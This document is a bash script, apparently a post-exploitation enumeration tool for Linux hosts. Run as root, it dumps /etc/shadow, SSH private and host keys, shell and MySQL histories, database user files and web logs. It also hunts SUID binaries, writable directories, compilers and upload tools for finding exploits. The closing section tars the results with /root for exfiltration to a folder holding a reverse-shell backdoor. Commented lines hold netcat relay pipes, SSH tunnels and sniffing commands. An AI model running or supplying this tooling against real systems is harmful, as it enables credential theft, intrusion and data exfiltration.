#!/bin/bash

###############################################################################################
#                                                                                             #
#                         Enumerate script compiled courtesy of N1NJ4                         #
#         Script will gather various OS information and output it to a specific file          #
#                                                                                             #
#                                                                                             #
#                      Lines or Commands that need more input or may not                      #
#                       be used have been commented out for convenience                       #
#                                                                                             #
#                  Examples: Communications & Networking - verify IP & port                   #
#                Any plain text usernames and/or passwords - change [filename]                #
#                                                                                             #
#                             Original file can be found at:                                  #
#              raw.githubusercontent.com/MiniLini/Enumerate/main/Enumerate_v1.sh              #
###############################################################################################

###############################################################################################
#                                                                                             #
#                    First, Check for root, Because the commands require it                   #
#                                                                                             #
###############################################################################################

CheckRoot()
{
    if [ `id -u` != 0 ]
    then
        echo "ERROR: You must be root user to run this program"
        exit
    fi
}

###############################################################################################
#                                                                                             #
#                           Name the output files using variables                             #
#                                                                                             #
###############################################################################################

Back_Door="/var/www/html/swancorp"                                                    # Where your reverse-shell.php is located
Enum_Report=(Enum_Report-$(date "+%F-%H-%M-%S").txt)
Enum_Log=(Enum_Webserver_Log-$(date "+%F-%H-%M-%S").txt)
Err_Log=(Enum_Report_Error_Log-$(date "+%F-%H-%M-%S").txt)
Enum_Tar=(Enum_Report-$(date "+%F-%H-%M-%S").tar)
Enum_Cap=(Enum_Net_Traffic-$(date "+%F-%H-%M-%S").txt)
Exact_Now=$(date)
file_loc=$(pwd)




###############################################################################################
#                                                                                             #
#                                      Time Stamp                                             #
#                                                                                             #
###############################################################################################

echo $Exact_Now | tee $Enum_Report $Enum_Log $Err_Log $Enum_Cap


###############################################################################################
###############################################################################################
#                                                                                             #
#                                    Now we ENUMERATE!                                        #
#                                                                                             #
###############################################################################################
###############################################################################################

###############################################################################################
#                                                                                             #
#                                    Operating System                                         #
#                                                                                             #
###############################################################################################

echo -e "\n\n\n\nOperating System Info:" | tee -a $Enum_Report
echo -e "\n\n\n\nOperating System Info:" | tee -a $Err_Log

echo -e "\n\nWhat's the distribution type? What version?\n" | tee -a $Enum_Report
echo -e "\n\nWhat's the distribution type? What version?\n" | tee -a $Err_Log

{
cat /etc/issue
cat /etc/lsb-release                                                                  # Debian based
# cat /etc/redhat-release                                                             # Redhat based
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nWhat's the kernel version? Is it 64-bit?\n" | tee -a $Enum_Report
echo -e "\n\nWhat's the kernel version? Is it 64-bit?\n" | tee -a $Err_Log

{
cat /proc/version
uname -a
uname -mrs
# rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nWhat can be learned from the environmental variables?\n" | tee -a $Enum_Report
echo -e "\n\nWhat can be learned from the environmental variables?\n" | tee -a $Err_Log

{
cat /etc/profile
# cat /etc/bashrc
# cat ~/.bash_profile
cat ~/.bashrc
# cat ~/.bash_logout
# env
# set
} >> $Enum_Report 2>>$Err_Log



# echo -e "\n\nIs there a printer?\n" | tee -a $Enum_Report
# echo -e "\n\nIs there a printer?\n" | tee -a $Err_Log

# {
# lpstat -a
# } >> $Enum_Report 2>>$Err_Log



###############################################################################################
#                                                                                             #
#                                   Applications & Services                                   #
#                                                                                             #
###############################################################################################

echo -e "\n\n\n\nApplications & Services:" | tee -a $Enum_Report
echo -e "\n\n\n\nApplications & Services:" | tee -a $Err_Log

echo -e "\n\nWhat services are running? Which service has which user privilege?\n" | tee -a $Enum_Report
echo -e "\n\nWhat services are running? Which service has which user privilege?\n" | tee -a $Err_Log

{
ps aux
ps -ef
top
cat /etc/services
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nWhat service(s) are been running by root?\n" | tee -a $Enum_Report
echo -e "\n\nWhat service(s) are been running by root?\n" | tee -a $Err_Log

{
ps aux | grep root
ps -ef | grep root
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nWhat applications are installed? What version are they? Are they currently running?\n" | tee -a $Enum_Report
echo -e "\n\nWhat applications are installed? What version are they? Are they currently running?\n" | tee -a $Err_Log

{
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
# rpm -qa
# ls -alh /var/cache/apt/archives/
# ls -alh /var/cache/yum/
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nAny of the services settings misconfigured? Are any vulnerable plugins attached?\n" | tee -a $Enum_Report
echo -e "\n\nAny of the services settings misconfigured? Are any vulnerable plugins attached?\n" | tee -a $Err_Log

{
# cat /etc/syslog.conf
# cat /etc/chttp.conf
# cat /etc/lighttpd.conf
# cat /etc/cups/cupsd.conf
# cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
# cat /etc/my.conf
# cat /etc/httpd/conf/httpd.conf
# cat /opt/lampp/etc/httpd.conf
# ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nWhat jobs are scheduled?\n" | tee -a $Enum_Report
echo -e "\n\nWhat jobs are scheduled?\n" | tee -a $Err_Log

{
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
# cat /etc/at.allow
cat /etc/at.deny
# cat /etc/cron.allow
# cat /etc/cron.deny
cat /etc/crontab
# cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
} >> $Enum_Report 2>>$Err_Log



###############################################################################################
#                                                                                             #
#                 Change [filename] to the name of your file and uncomment                    #
#                                                                                             #
###############################################################################################

# echo -e "\n\nAny plain text usernames and/or passwords?\n" | tee -a $Enum_Report
# echo -e "\n\nAny plain text usernames and/or passwords?\n" | tee -a $Err_Log
# {
# grep -i user [filename]
# grep -i pass [filename]
# grep -C 5 "password" [filename]
# find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"                  # Joomla
# } >> $Enum_Report 2>>$Err_Log



###############################################################################################
#                                                                                             #
#                                Communications & Networking                                  #
#                                                                                             #
###############################################################################################

echo -e "\n\n\n\nCommunications & Networking:" | tee -a $Enum_Report
echo -e "\n\n\n\nCommunications & Networking:" | tee -a $Err_Log

echo -e "\n\nWhat NIC(s) does the system have? Is it connected to another network?\n" | tee -a $Enum_Report
echo -e "\n\nWhat NIC(s) does the system have? Is it connected to another network?\n" | tee -a $Err_Log

{
/sbin/ifconfig -a
cat /etc/network/interfaces                                                           # Debian based
# cat /etc/sysconfig/network                                                          # Redhat based
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nWhat are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?\n" | tee -a $Enum_Report
echo -e "\n\nWhat are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?\n" | tee -a $Err_Log

{
cat /etc/resolv.conf
iptables -L
hostname
dnsdomainname
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nWhat other users & hosts are communicating with the system?\n" | tee -a $Enum_Report
echo -e "\n\nWhat other users & hosts are communicating with the system?\n" | tee -a $Err_Log

{
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
# chkconfig --list
# chkconfig --list | grep 3:on
last
w
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nWhats cached? IP and/or MAC addresses\n" | tee -a $Enum_Report
echo -e "\n\nWhats cached? IP and/or MAC addresses\n" | tee -a $Err_Log

{
arp -e
route
/sbin/route -nee
} >> $Enum_Report 2>>$Err_Log



###############################################################################################
#                                  NOTE for commands below:                                   #
#                                                                                             #
#                    tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]                      #
#           FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]             #
#         ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]           #
# mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe #
###############################################################################################


# echo -e "\n\nIs packet sniffing possible? What can be seen? Listen to live traffic\n" | tee -a $Enum_Cap
# echo -e "\n\nIs packet sniffing possible? What can be seen? Listen to live traffic\n" | tee -a $Err_Log

# {
# tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 -w $Enum_Cap
# } 2>>$Err_Log



# echo -e "\n\nIs port forwarding possible? Redirect and interact with traffic from another view\n" | tee -a $Enum_Report
# echo -e "\n\nIs port forwarding possible? Redirect and interact with traffic from another view\n" | tee -a $Err_Log

# {
# FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
# } >> $Enum_Report 2>>$Err_Log


# {
# ssh -L 8080:127.0.0.1:80 root@192.168.1.7                                             # Local Port
# ssh -R 8080:127.0.0.1:80 root@192.168.1.7                                             # Remote Port
# } >> $Enum_Report 2>>$Err_Log


# {
# mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe              # Port Relay
# mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
# mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe  # Proxy monitor (Port 80 to 8080)
# } 2>>$Err_Log



# echo -e "\n\nIs tunnelling possible? Send commands locally, remotely\n" | tee -a $Enum_Report
# echo -e "\n\nIs tunnelling possible? Send commands locally, remotely\n" | tee -a $Err_Log

# {
# ssh -D 127.0.0.1:9050 -N [username]@[ip]
# proxychains ifconfig
# } >> $Enum_Report 2>>$Err_Log


###############################################################################################
#                                                                                             #
#                            Change [IP] to correct IP address                                #
#                                                                                             #
###############################################################################################

# echo -e "\n\nIs packet sniffing possible? What can be seen? Listen to live traffic\n" | tee -a $Enum_Report
# echo -e "\n\nIs packet sniffing possible? What can be seen? Listen to live traffic\n" | tee -a $Err_Log

# {
# tcpdump tcp dst [IP] 80 and tcp dst [IP] 21
# } >> $Enum_Report 2>>$Err_Log



###############################################################################################
#                                                                                             #
#                             Confidential Information & Users                                #
#                                                                                             #
###############################################################################################

echo -e "\n\n\n\nConfidential Information & Users:" | tee -a $Enum_Report
echo -e "\n\n\n\nConfidential Information & Users:" | tee -a $Err_Log

echo -e "\n\nWho are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?\n" | tee -a $Enum_Report
echo -e "\n\nWho are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?\n" | tee -a $Err_Log

{
id
who
w
last
cat /etc/passwd | cut -d: -f1
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'
awk -F: '($3 == "0") {print}' /etc/passwd
cat /etc/sudoers
sudo -l
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nWhat sensitive files can be found?\n" | tee -a $Enum_Report
echo -e "\n\nWhat sensitive files can be found?\n" | tee -a $Err_Log

{
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nAnything interesting in the home directories? If it's possible to access\n" | tee -a $Enum_Report
echo -e "\n\nAnything interesting in the home directories? If it's possible to access\n" | tee -a $Err_Log

{
ls -ahlR /root/
ls -ahlR /home/
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nAre there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords\n" | tee -a $Enum_Report
echo -e "\n\nAre there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords\n" | tee -a $Err_Log

{
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nWhat has the user being doing? Is there any password in plain text? What have they been edting?\n" | tee -a $Enum_Report
echo -e "\n\nWhat has the user being doing? Is there any password in plain text? What have they been edting?\n" | tee -a $Err_Log

{
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nWhat user information can be found?\n" | tee -a $Enum_Report
echo -e "\n\nWhat user information can be found?\n" | tee -a $Err_Log

{
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nCan private-key information be found?\n" | tee -a $Enum_Report
echo -e "\n\nCan private-key information be found?\n" | tee -a $Err_Log

{
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
} >> $Enum_Report 2>>$Err_Log



###############################################################################################
#                                                                                             #
#                                       File Sysytems                                         #
#                                                                                             #
###############################################################################################

echo -e "\n\n\n\nFile Systems:" | tee -a $Enum_Report
echo -e "\n\n\n\nFile Systems:" | tee -a $Err_Log

echo -e "\n\nHow are file-systems mounted?\n" | tee -a $Enum_Report
echo -e "\n\nHow are file-systems mounted?\n" | tee -a $Err_Log

{
mount
df -h
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nAre there any unmounted file-systems?\n" | tee -a $Enum_Report
echo -e "\n\nAre there any unmounted file-systems?\n" | tee -a $Err_Log

{
cat /etc/fstab
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nWhich configuration files can be written in /etc/? Able to reconfigure a service?\n" | tee -a $Enum_Report
echo -e "\n\nWhich configuration files can be written in /etc/? Able to reconfigure a service?\n" | tee -a $Err_Log

{
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null                                       # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null                                         # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null                                      # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null                                          # Other
find /etc/ -readable -type f 2>/dev/null                                              # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null                                  # Anyone
} >> $Enum_Report



echo -e "\n\nWhat can be found in /var/ ?\n" | tee -a $Enum_Report
echo -e "\n\nWhat can be found in /var/ ?\n" | tee -a $Err_Log

{
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nAny settings/files (hidden) on website? Any settings file with database information?\n" | tee -a $Enum_Report
echo -e "\n\nAny settings/files (hidden) on website? Any settings file with database information?\n" | tee -a $Err_Log

{
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
} >> $Enum_Report 2>>$Err_Log


###############################################################################################
#                                                                                             #
#                                   Comprehensive log-list                                    #
#                                                                                             #
###############################################################################################

echo -e "\n\nAre there anything in the log files?\n" | tee -a $Enum_Report
echo -e "\n\nAre there anything in the log files?\n" | tee -a $Err_Log

cat /etc/httpd/logs/access_log >> $Enum_Log 2>>$Err_Log

cat /etc/httpd/logs/access.log >> $Enum_Log 2>>$Err_Log

cat /etc/httpd/logs/error_log >> $Enum_Log 2>>$Err_Log

cat /etc/httpd/logs/error.log >> $Enum_Log 2>>$Err_Log

cat /var/log/apache2/access_log >> $Enum_Log 2>>$Err_Log

cat /var/log/apache2/access.log >> $Enum_Log 2>>$Err_Log

cat /var/log/apache2/error_log >> $Enum_Log 2>>$Err_Log

cat /var/log/apache2/error.log >> $Enum_Log 2>>$Err_Log

cat /var/log/apache/access_log >> $Enum_Log 2>>$Err_Log

cat /var/log/apache/access.log >> $Enum_Log 2>>$Err_Log

cat /var/log/auth.log >> $Enum_Log 2>>$Err_Log

cat /var/log/chttp.log >> $Enum_Log 2>>$Err_Log

cat /var/log/cups/error_log >> $Enum_Log 2>>$Err_Log

cat /var/log/dpkg.log >> $Enum_Log 2>>$Err_Log

cat /var/log/faillog >> $Enum_Log 2>>$Err_Log

cat /var/log/httpd/access_log >> $Enum_Log 2>>$Err_Log

cat /var/log/httpd/access.log >> $Enum_Log 2>>$Err_Log

cat /var/log/httpd/error_log >> $Enum_Log 2>>$Err_Log

cat /var/log/httpd/error.log >> $Enum_Log 2>>$Err_Log

cat /var/log/lastlog >> $Enum_Log 2>>$Err_Log

cat /var/log/lighttpd/access.log >> $Enum_Log 2>>$Err_Log

cat /var/log/lighttpd/error.log >> $Enum_Log 2>>$Err_Log

cat /var/log/lighttpd/lighttpd.access.log >> $Enum_Log 2>>$Err_Log

cat /var/log/lighttpd/lighttpd.error.log >> $Enum_Log 2>>$Err_Log

cat /var/log/messages >> $Enum_Log 2>>$Err_Log

cat /var/log/secure >> $Enum_Log 2>>$Err_Log

cat /var/log/syslog >> $Enum_Log 2>>$Err_Log

cat /var/log/wtmp >> $Enum_Log 2>>$Err_Log

cat /var/log/xferlog >> $Enum_Log 2>>$Err_Log

cat /var/log/yum.log >> $Enum_Log 2>>$Err_Log

cat /var/run/utmp >> $Enum_Log 2>>$Err_Log

cat /var/webmin/miniserv.log >> $Enum_Log 2>>$Err_Log

cat /var/www/logs/access_log >> $Enum_Log 2>>$Err_Log

cat /var/www/logs/access.log >> $Enum_Log 2>>$Err_Log

ls -alh /var/lib/dhcp3/ >> $Enum_Log 2>>$Err_Log

ls -alh /var/log/postgresql/ >> $Enum_Log 2>>$Err_Log

ls -alh /var/log/proftpd/ >> $Enum_Log 2>>$Err_Log

ls -alh /var/log/samba/ >> $Enum_Log 2>>$Err_Log

# Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp




echo -e "\n\nWhat Advanced Linux File Permissions are used, Sticky bits, SUID & GUID?\n" | tee -a $Enum_Report
echo -e "\n\nWhat Advanced Linux File Permissions are used, Sticky bits, SUID & GUID?\n" | tee -a $Err_Log

{
find / -perm -1000 -type d 2>/dev/null                                                # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null                                                 # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null                                                 # SUID (chmod 4000) - run as the owner, not the user who started it.
} >>$Enum_Report


find / -perm -g=s -o -perm -u=s -type f 2>/dev/null >> $Enum_Report                                                # SGID or SUID

for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done >>$Enum_Report  # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null >>$Enum_Report               # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)




echo -e "\n\nWhere can written to and executed from? A few common places like /tmp, /var/tmp, /dev/shm\n" | tee -a $Enum_Report
echo -e "\n\nWhere can written to and executed from? A few common places like /tmp, /var/tmp, /dev/shm\n" | tee -a $Err_Log

{
find / -writable -type d 2>/dev/null                                                  # world-writeable folders
find / -perm -222 -type d 2>/dev/null                                                 # world-writeable folders
find / -perm -o w -type d 2>/dev/null                                                 # world-writeable folders
find / -perm -o x -type d 2>/dev/null                                                 # world-executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null                                # world-writeable & executable folders
} >>$Enum_Report



echo -e "\n\nAny problem files? Word-writeable or nobody files\n" | tee -a $Enum_Report
echo -e "\n\nAny problem files? Word-writeable or nobody files\n" | tee -a $Err_Log

{
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print                        # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print                                      # Noowner files
} >> $Enum_Report 2>>$Err_Log



###############################################################################################
#                                                                                             #
#                              Preparation & Finding Exploit Code                             #
#                                                                                             #
###############################################################################################

echo -e "\n\n\n\nPreparation & Finding Exploit Code:\n" | tee -a $Enum_Report
echo -e "\n\n\n\nPreparation & Finding Exploit Code:\n" | tee -a $Err_Log

echo -e "\n\nWhat development tools/languages are installed/supported?\n" | tee -a $Enum_Report
echo -e "\n\nWhat development tools/languages are installed/supported?\n" | tee -a $Err_Log

{
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
} >> $Enum_Report 2>>$Err_Log



echo -e "\n\nHow can files be uploaded?\n" | tee -a $Enum_Report
echo -e "\n\nHow can files be uploaded?\n" | tee -a $Err_Log

{
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
} >> $Enum_Report 2>>$Err_Log



###############################################################################################
#                                                                                             #
#         The End: Tar the output files, prepare them for exfiltration and clean up           #
#                                                                                             #
###############################################################################################

echo -e "\n\n\nThe End" | tee -a $Enum_Report
echo -e "\n\n\nThe End" | tee -a $Enum_Log
echo -e "\n\n\nThe End" | tee -a $Err_Log

tar -cf ER.tar $Enum_Report $Enum_Log $Enum_Cap $Err_Log /var/log/apache2 /var/log/tomcat7 /root
# mv ER.tar ${Back_Door}/${Enum_Tar}

# rm -r Enum_*
